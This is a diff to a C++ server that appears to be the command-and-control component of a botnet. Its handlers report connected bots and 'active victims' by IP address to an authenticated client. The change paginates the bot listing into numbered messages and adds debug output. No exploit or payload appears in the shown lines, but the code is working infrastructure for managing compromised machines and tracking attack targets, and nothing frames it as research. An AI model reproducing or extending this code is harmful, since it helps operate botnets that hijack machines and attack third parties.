@@ -96,34 +96,67 @@ void server::handleInit(std::string& command, std::vector<std::string>& params, 
 }
 
 void server::handleGetClientsData(std::string& command, std::vector<std::string>& params, session* client) {
-	if (!params.size()) return;
+	if (params.empty()) return;
 	if (!checkHash_(params[0])) return;
 
-	std::vector<std::string> output_params = {"5", "[IP-address]", "[Connected]", "[Messages]", "[Victims]", "[Status]"};
+	int bot_counter = 0;
+	int max_bot_num_per_msg = 2;
+	int current_msg = 0;
+
+	std::vector<std::string> msg;
+	std::vector<std::string> parameters = {"[IP-address]", "[Connected]", "[Messages]", "[Victims]", "[Role]"};
+	std::vector<std::vector<std::string>> output_data;
+
 	{
 		std::unique_lock<std::mutex> lock(clients_data_m_);
+
+		int msgs_to_transfer = ceil((float)clients_data_container_.size() / max_bot_num_per_msg);
+
 		for (auto& bot : clients_data_container_) {
-			output_params.push_back(bot.first);
-			output_params.push_back(bot.second.connected);
-			output_params.push_back(std::to_string(bot.second.msgs_from));
-			output_params.push_back(std::to_string(bot.second.victims));
-			output_params.push_back(bot.second.status);
+			if (bot_counter >= max_bot_num_per_msg || !bot_counter) {
+				if (bot_counter) {
+					output_data.emplace_back(std::move(msg));
+					msg.clear();
+				}
+				bot_counter = 0;
+
+				msg.push_back(std::to_string(current_msg + 1));
+				msg.push_back(std::to_string(msgs_to_transfer));
+				msg.push_back(std::to_string(parameters.size()));
+
+				msg.insert(msg.end(), parameters.begin(), parameters.end());
+
+				++current_msg;
+			}
+
+			msg.push_back(bot.first);
+			msg.push_back(bot.second.connected);
+			msg.push_back(std::to_string(bot.second.msgs_from));
+			msg.push_back(std::to_string(bot.second.victims));
+			msg.push_back(bot.second.status);
+
+			++bot_counter;
 		}
+		output_data.emplace_back(std::move(msg));
 	}
-	client->send(msg_parser_.genCommand(command, output_params));
+
+	for (auto& item : output_data) {
+		std::cout << msg_parser_.genCommand(command, item) << std::endl;
+		client->send(msg_parser_.genCommand(command, item));
+	}
 }
 
 void server::handleGetVictimsData(std::string& command, std::vector<std::string>& params, session* client) {
 	if (!params.size()) return;
 	if (!checkHash_(params[0])) return;
 
-	std::vector<std::string> output_params = {"1", "[Active_Victims]"};
+	std::vector<std::string> output_params = {"1", "1", "1", "[Active_Victims]"};
 
 	for (auto& victim : victims_ips_) {
 		PRINT("VICTIMS: ", victim);
 		output_params.push_back(victim);
 	}
-
+	PRINT("SENT: ", msg_parser_.genCommand(command, output_params));
 	client->send(msg_parser_.genCommand(command, output_params));
 }
 
